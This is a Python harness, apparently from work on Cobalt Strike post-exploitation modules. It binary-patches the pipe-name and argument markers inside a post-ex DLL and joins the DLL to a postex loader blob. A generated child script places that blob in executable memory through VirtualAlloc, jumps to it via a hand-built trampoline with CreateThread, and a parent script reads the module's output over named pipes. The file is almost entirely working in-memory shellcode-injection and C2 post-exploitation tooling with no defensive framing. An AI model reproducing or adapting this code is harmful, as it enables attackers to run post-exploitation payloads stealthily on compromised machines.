# -*- coding: utf-8 -*-
"""kit2_two_pipes.py - THE final fix: control pipe and output pipe must be
DISTINCT names (official contract: 'two variations of the post-ex.pipename').
Patch dll's gPipeName = ctrl; config output_pipe = out; parent connects BOTH
(control satisfies dllmain's 10s wait, output receives the BOF chunks)."""
import ctypes
import os
import struct
import subprocess
import sys
import time
from ctypes import wintypes

sys.path.insert(0, r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-beacon\feat-post-4.9.1\tools")
import kit_local_harness2 as H

STAMP = str(int(time.time()))
CTRL = r"\\.\pipe\kit_ctrl_" + STAMP
OUT = r"\\.\pipe\kit_out_" + STAMP

FULL = H.FULL
WIRE = FULL + struct.pack(">i", 0)

ARGS = (struct.pack(">i", 1) + struct.pack(">i", 2) + struct.pack(">i", 1)
        + H.L(b"ntdll.dll!RtlUserThreadStart+0x21\x00")
        + H.L(OUT.encode() + b"\x00") + H.L(WIRE))

PIPEMARK = b"POST_EX_PIPE_NAME_PLEASE_DO_NOT_CHANGE_OR_REMOVE"
FULLPIPE_MARK = b"\\\\.\\pipe\\" + PIPEMARK
ARGSMARK = b"_POSTEX_ARGUMENTS_"


def patch_kit(data):
    d = bytearray(data)
    i = bytes(d).find(FULLPIPE_MARK)
    assert i > 0
    name = CTRL.encode() + b"\x00"
    name = name + b"\x00" * (len(FULLPIPE_MARK) - len(name))
    d[i:i + len(FULLPIPE_MARK)] = name
    i = bytes(d).find(ARGSMARK)
    assert i > 0
    hdr = (struct.pack("<i", 0x0A2A1DE0) + b"AAAA" + b"N" + b"\x00\x00\x00"
           + struct.pack("<i", 1 << 20) + struct.pack("<i", len(ARGS)))
    assert len(hdr) == 20
    d[i:i + 20] = hdr
    return bytes(d)


if __name__ == "__main__":
    CHILD = r"C:\Users\Public\kit2_child.py"
    child_src = (
        "import ctypes, struct, sys, time, os\n"
        "from ctypes import wintypes\n"
        "sys.path.insert(0, r'C:\\Users\\Administrator\\Desktop\\cobaltstrike\\cobaltstrike-beacon\\feat-post-4.9.1\\tools')\n"
        "import kit_local_harness2 as H\n"
        "CTRL = sys.argv[1]; OUT = sys.argv[2]\n"
        "ARGS = (struct.pack('>i',1)+struct.pack('>i',2)+struct.pack('>i',1)"
        "+H.L(b'ntdll.dll!RtlUserThreadStart+0x21\\x00')"
        "+H.L(OUT.encode()+b'\\x00')+H.L(H.FULL + struct.pack('>i',0)))\n"
        "PIPEMARK = b'POST_EX_PIPE_NAME_PLEASE_DO_NOT_CHANGE_OR_REMOVE'\n"
        "FULLPIPE_MARK = b'\\\\\\\\.\\\\pipe\\\\' + PIPEMARK\n"
        "ARGSMARK = b'_POSTEX_ARGUMENTS_'\n"
        "def patch_kit(data):\n"
        "    d = bytearray(data)\n"
        "    i = bytes(d).find(FULLPIPE_MARK)\n"
        "    assert i > 0\n"
        "    name = CTRL.encode() + b'\\x00'\n"
        "    name = name + b'\\x00' * (len(FULLPIPE_MARK) - len(name))\n"
        "    d[i:i + len(FULLPIPE_MARK)] = name\n"
        "    i = bytes(d).find(ARGSMARK)\n"
        "    assert i > 0\n"
        "    hdr = (struct.pack('<i', 0x0A2A1DE0) + b'AAAA' + b'N' + b'\\x00\\x00\\x00'\n"
        "           + struct.pack('<i', 1 << 20) + struct.pack('<i', len(ARGS)))\n"
        "    d[i:i + 20] = hdr\n"
        "    return bytes(d)\n"
        "k32 = ctypes.windll.kernel32\n"
        "k32.VirtualAlloc.restype = ctypes.c_void_p\n"
        "dll = patch_kit(open(r'C:\\Users\\Public\\kit_async.x64.dll', 'rb').read())\n"
        "loader = open(r'C:\\Users\\Administrator\\Desktop\\cobaltstrike\\cobaltstrike-ts\\p3-llvm-bench\\src\\main\\resources\\resources\\postex-loader.x64.bin', 'rb').read()\n"
        "blob = loader + dll\n"
        "base = k32.VirtualAlloc(None, len(blob), 0x3000, 0x40)\n"
        "ctypes.memmove(base, blob, len(blob))\n"
        "ab = k32.VirtualAlloc(None, len(ARGS), 0x3000, 0x04)\n"
        "ctypes.memmove(ab, ARGS, len(ARGS))\n"
        "tramp = k32.VirtualAlloc(None, 0x1000, 0x3000, 0x40)\n"
        "code = bytearray(11)\n"
        "code[0] = 0x41; code[1] = 0xB9; code[2:6] = struct.pack('<I', 1)\n"
        "code[6] = 0xE9\n"
        "code[7:11] = struct.pack('<i', base - (tramp + 11))\n"
        "ctypes.memmove(tramp, bytes(code), 11)\n"
        "print('pid', os.getpid(), flush=True)\n"
        "k32.CreateThread(None, 0, ctypes.cast(tramp, wintypes.LPVOID), ctypes.c_void_p(ab), 0, None)\n"
        "time.sleep(90)\n"
        "print('SURVIVED', flush=True)\n"
    )
    open(CHILD, "w").write(child_src)

    PARENT = r"C:\Users\Public\kit2_parent2.py"
    parent_src = (
        "import time, ctypes, sys\n"
        "from ctypes import wintypes\n"
        "k32 = ctypes.windll.kernel32\n"
        "k32.CreateFileW.restype = wintypes.HANDLE\n"
        "GENERIC_RW = 0x80000000 | 0x40000000\n"
        "def open_pipe(name, timeout=30):\n"
        "    t0 = time.time()\n"
        "    while time.time() - t0 < timeout:\n"
        "        h = k32.CreateFileW(name, GENERIC_RW, 0, None, 3, 0, None)\n"
        "        if h and h != wintypes.HANDLE(-1).value:\n"
        "            return h\n"
        "        time.sleep(0.2)\n"
        "    return None\n"
        "CTRL, OUT = sys.argv[1], sys.argv[2]\n"
        "hc = open_pipe(CTRL, 20)\n"
        "print('ctrl connected:', hc is not None, flush=True)\n"
        "ho = open_pipe(OUT, 60)\n"
        "print('out connected:', ho is not None, flush=True)\n"
        "if not ho:\n"
        "    raise SystemExit\n"
        "import threading\n"
        "def reader(tag, h):\n"
        "    while True:\n"
        "        buf = ctypes.create_string_buffer(65536)\n"
        "        got = wintypes.DWORD(0)\n"
        "        ok = k32.ReadFile(h, buf, 65536, ctypes.byref(got), None)\n"
        "        if ok and got.value:\n"
        "            printable = bytes(c if 32 <= c < 127 else 46 for c in buf.raw[:got.value][:96])\n"
        "            print('%s RECV %d B: %s' % (tag, got.value, printable.decode()), flush=True)\n"
        "        else:\n"
        "            time.sleep(0.3)\n"
        "threading.Thread(target=reader, args=('OUT', ho), daemon=True).start()\n"
        "threading.Thread(target=reader, args=('CTRL', hc), daemon=True).start()\n"
        "time.sleep(45)\n"
        "print('done')\n"
    )
    open(PARENT, "w").write(parent_src)

    p = subprocess.Popen([sys.executable, "-I", CHILD, CTRL, OUT], cwd=r"C:\Users\Public",
                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    p.stdout.readline()  # pid line
    time.sleep(1)
    p2 = subprocess.Popen([sys.executable, "-I", PARENT, CTRL, OUT], cwd=r"C:\Users\Public",
                          stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    try:
        p2.wait(timeout=140)
    except Exception:
        p2.kill()
    try:
        p.kill()
    except Exception:
        pass
    print("=== PARENT ===")
    print(p2.stdout.read().decode(errors="replace")[:1500])
